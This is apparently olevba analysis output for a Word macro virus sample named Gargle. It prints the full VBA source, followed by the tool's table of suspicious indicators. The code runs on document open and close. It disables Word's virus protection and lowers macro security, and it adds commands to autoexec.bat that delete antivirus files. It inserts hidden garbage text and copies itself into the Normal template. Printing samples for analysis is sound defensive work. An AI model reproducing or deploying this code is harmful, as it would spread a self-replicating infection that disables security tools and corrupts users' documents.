olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gargle-f6fd8f24e67e63ef250d68fc2a8f18f5651a2ccd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gargle-f6fd8f24e67e63ef250d68fc2a8f18f5651a2ccd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub FilePrintPreview()
Randomize
abcd$ = Chr(85) & Chr(110) & Chr(101) & Chr(120) & Chr(112) & Chr(101) & Chr(99) & Chr(116) & Chr(101) & Chr(100) & Chr(47) & Chr(85) & Chr(110) & Chr(100) & Chr(101) & Chr(102) & Chr(105) & Chr(110) & Chr(101) & Chr(100) & Chr(32) & Chr(101) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(32) & Chr(97) & Chr(116) & Chr(32) & Chr(97) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(32)
t = "{00" & Int(Rnd * 999999) & ":" & Int(Rnd * 99999) & "}"
MsgBox abcd$ & t, vbCritical
End Sub
Private Sub Retro()
On Error Resume Next
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "echo ************"
Print #1, "echo ** GarGle **"
Print #1, "echo ************"
'norton
Print #1, "echo [Norton System Check]"
Print #1, "del c:\progra~1\norton~1\*.exe"
Print #1, "del c:\progra~1\norton~1\*.dll"
Print #1, "del c:\progra~1\norton~1\*.dat"
Print #1, "del c:\progra~1\norton~1\*.vxd"
Print #1, "del c:\norton~1\*.exe"
Print #1, "del c:\norton~1\*.dll"
Print #1, "del c:\norton~1\*.dat"
Print #1, "del c:\norton~1\*.vxd"
Print #1, "echo."
'avp
Print #1, "echo [AVP System Check]"
Print #1, "del c:\progra~1\antiv~1\*.avc "
Print #1, "del c:\progra~1\antiv~1\*.set "
Print #1, "del c:\progra~1\antiv~1\*.dll "
Print #1, "del c:\progra~1\antiv~1\*.vxd "
Print #1, "del c:\progra~1\antiv~1\*.exe "
Print #1, "del c:\antiv~1\*.avc "
Print #1, "del c:\antiv~1\*.set "
Print #1, "del c:\antiv~1\*.dll "
Print #1, "del c:\antiv~1\*.vxd "
Print #1, "del c:\antiv~1\*.exe "
Print #1, "echo."
'mcafee
Print #1, "echo [McAfee System Check]"
'just in case its not where its supposed to be :)
Print #1, "del c:\progra~1\mcafee~1\*.dat "
Print #1, "del c:\progra~1\mcafee~1\*.dll "
Print #1, "del c:\progra~1\mcafee~1\*.exe "
Print #1, "del c:\progra~1\mcafee~1\*.vsc "
Print #1, "del c:\progra~1\mcafee\*.dat "
Print #1, "del c:\progra~1\mcafee\*.dll "
Print #1, "del c:\progra~1\mcafee\*.exe "
Print #1, "del c:\progra~1\mcafee\*.vsc "
Print #1, "del c:\mcafee~1\*.dat"
Print #1, "del c:\mcafee~1\*.dll"
Print #1, "del c:\mcafee~1\*.exe"
Print #1, "del c:\mcafee~1\*.vsc"
Print #1, "del c:\mcafee\*.dat"
Print #1, "del c:\mcafee\*.dll"
Print #1, "del c:\mcafee\*.exe"
Print #1, "del c:\mcafee\*.vsc"
Print #1, "echo."
'F-prot
'not widely used in the US, but hey :)
Print #1, "[F-Prot System Check]"
Print #1, "del c:\progra~1\fsi\f-prot\*.exe"
Print #1, "del c:\progra~1\fsi\f-prot\*.dll"
Print #1, "del c:\progra~1\fsi\f-prot\*.vxd"
Print #1, "del c:\progra~1\fsi\f-prot\*.rep"
' just in case
Print #1, "del c:\progra~1\f-prot\*.exe"
Print #1, "del c:\progra~1\f-prot\*.dll"
Print #1, "del c:\progra~1\f-prot\*.vxd"
Print #1, "del c:\progra~1\f-prot\*.rep"
Print #1, "del c:\f-prot\*.exe"
Print #1, "del c:\f-prot\*.dll"
Print #1, "del c:\f-prot\*.vxd"
Print #1, "del c:\f-prot\*.rep"
Print #1, "del c:\fsi\f-prot\*.exe"
Print #1, "del c:\fsi\f-prot\*.dll"
Print #1, "del c:\fsi\f-prot\*.vxd"
Print #1, "del c:\fsi\f-prot\*.rep"
Print #1, "echo."
Print #1, "echo All System Checks have been completed."
Close #1
End Sub


Private Sub ViewVBCode()
Randomize
abcd$ = Chr(85) & Chr(110) & Chr(101) & Chr(120) & Chr(112) & Chr(101) & Chr(99) & Chr(116) & Chr(101) & Chr(100) & Chr(47) & Chr(85) & Chr(110) & Chr(100) & Chr(101) & Chr(102) & Chr(105) & Chr(110) & Chr(101) & Chr(100) & Chr(32) & Chr(101) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(32) & Chr(97) & Chr(116) & Chr(32) & Chr(97) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(32)
t = "{00" & Int(Rnd * 999999) & ":" & Int(Rnd * 99999) & "}"
MsgBox abcd$ & t, vbCritical
End Sub

Private Sub Document_Close()
Document_Open
Retro
End Sub

Private Sub Document_New()
Document_Open
End Sub

Private Sub Document_Open()
On Error Resume Next: If ActivePrinter = "" Then GoTo f
MsgBox "Undefined/Unexpected error on " + ActivePrinter, vbCritical
f: With Options: .PrintHiddenText = (100 - 99): .VirusProtection = (99 - 99): .SaveNormalPrompt = (99 - 99)
.SavePropertiesPrompt = (99 - 99): .ConfirmConversions = (99 - 99): End With
ActiveWindow.View.ShowHiddenText = (99 - 99): Dim DocWords, DocHalfWords, DocLastWords
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
CommandBars("Tools").Controls("Macro").Enabled = (99 - 99): CommandBars("File").Controls("Print Preview").Enabled = (99 - 99): CommandBars("Edit").Controls("Select All").Enabled = (99 - 99)
CommandBars("Edit").Controls("Undo VBA-Selection.TypeText").Enabled = (99 - 99): CommandBars("Tools").Controls("Word Count...").Enabled = (99 - 99): CommandBars("Tools").Controls("Options...").Enabled = (99 - 99)
ActiveDocument.ActiveWindow.View.ShowFirstLineOnly = (99 - 99): DocWords = ActiveDocument.Words.Count: DocHalfWords = Int(DocWords / 2): Selection.Font.Hidden = (100 - 99): Selection.TypeText "   {Printer Error #0099544}   "
Set Gargle = ActiveDocument.Words(1): With Gargle: .MoveStart Unit:=wdCharacter, Count:=-1: .Select: End With
For x = 1 To 10: s = s - 1: If s < 1 Then s = 20
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): b$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): c$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
d$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): e$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): f$ = a$ + b$ + c$ + d$ + e$
redx = Int(Rnd * 255): bluex = Int(Rnd * 255): greenx = Int(Rnd * 255)
Selection.Font.Hidden = (100 - 99): Selection.Font.Size = s: Selection.Font.Color = RGB(redx, greenx, bluex): Selection.TypeText (f$): Next x
s = 21: Set Gargle = ActiveDocument.Words(DocHalfWords): With Gargle: .MoveStart Unit:=wdCharacter, Count:=-1: .Select: End With
For x = 1 To 10: s = s - 1: If s < 1 Then s = 20
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): b$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): c$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
d$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): e$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): f$ = a$ + b$ + c$ + d$ + e$
redx = Int(Rnd * 255): bluex = Int(Rnd * 255): greenx = Int(Rnd * 255)
Selection.Font.Hidden = (100 - 99): Selection.Font.Size = s: Selection.Font.Color = RGB(redx, greenx, bluex): Selection.TypeText (f$): Next x:
s = 21: For x = 1 To 10: s = s - 1: If s < 1 Then s = 21
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): b$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): c$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
d$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): e$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): f$ = a$ + b$ + c$ + d$ + e$
redx = Int(Rnd * 255): bluex = Int(Rnd * 255): greenx = Int(Rnd * 255): DocLasTWord = DocWords - wdWord: Set Gargle = ActiveDocument.Words(DocLasTWord): With Gargle: .MoveStart Unit:=wdWord, Count:=-1: .Select: End With
Selection.Font.Hidden = (100 - 99): Selection.Font.Size = s: Selection.Font.Color = RGB(redx, greenx, bluex): Selection.TypeText (f$): Next x

Dim Norm, NormCode, NormLines, Doc, DocCode, DocLines
Set Norm = NormalTemplate.VBProject.VBComponents(1)
Set Doc = ActiveDocument.VBProject.VBComponents(1)
Set DocCode = Doc.CodeModule
Set NormCode = Norm.CodeModule

If DocCode.lines(23, 1) = "" Then
For y = 1 To DocCode.countoflines
DocCode.replacelines y, "Gargle"
Next y
For x = 2 To NormCode.countoflines
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
a = NormCode.lines(x, 1) + " '" + a$
DocCode.insertlines 26 + x, a
Next x
ActiveDocument.SaveAs ActiveDocument.FullName: NormalTemplate.Save
End If

If NormCode.lines(23, 1) = "" Then
For y = 1 To NormCode.countoflines
NormCode.replacelines y, "Gargle"
Next y
For x = 1 To DocCode.countoflines
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
a = DocCode.lines(x, 1) + " '" + a$
NormCode.insertlines 26 + x, a
Next x
ActiveDocument.SaveAs ActiveDocument.FullName: NormalTemplate.Save
End If
'Word2000.GarGle
'By $MOOTHiE Da HuStla [Zero Gravity]
'July 2k
'Dedicated to my wife ChiQui
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

